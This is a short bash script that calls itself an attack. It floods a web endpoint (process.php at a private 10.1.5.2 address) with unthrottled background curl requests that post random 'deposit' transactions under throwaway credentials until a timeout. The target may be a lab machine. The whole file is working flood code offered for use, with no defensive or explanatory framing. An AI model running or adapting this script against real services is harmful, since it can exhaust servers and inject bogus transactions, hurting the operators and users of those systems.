#!/bin/bash
SEED=$( cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 20 | head -n 1 )

USER=$( echo $SEED | cut -c1-6 )
PASS=$( echo $SEED | cut -c7-15 )

TIMEOUT=10
re='^[0-9]+$'

if [[ ( $# -eq 1 ) && ( $1 =~ $re ) ]]  # Check integer value
then
    TIMEOUT=$1
fi

echo "--- The attack will terminate in $TIMEOUT seconds ---"

# Main loop
start=$SECONDS
count=0
while true
do
    curl -sS "10.1.5.2/process.php?user=$USER&pass=$PASS&drop=deposit&amount=$((5 + $RANDOM % 90))" >/dev/null &
    count=$(( count + 1 ))
    duration=$(( SECONDS - start ))

    if [[ $duration -gt $TIMEOUT ]]
    then
        echo "--- Completed ($count requests sent) ---"
        exit
    fi
done